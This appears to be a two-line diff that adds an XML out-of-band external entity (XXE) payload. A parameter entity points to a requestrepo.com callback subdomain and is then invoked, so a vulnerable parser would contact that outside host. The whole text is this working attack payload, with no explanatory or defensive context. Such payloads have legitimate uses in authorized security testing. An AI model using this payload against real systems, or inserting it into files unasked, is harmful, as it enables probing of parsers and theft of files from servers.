@@ -1,0 +1,2 @@
+<!ENTITY % resp SYSTEM "http://bb8d512u.requestrepo.com">
+%resp;
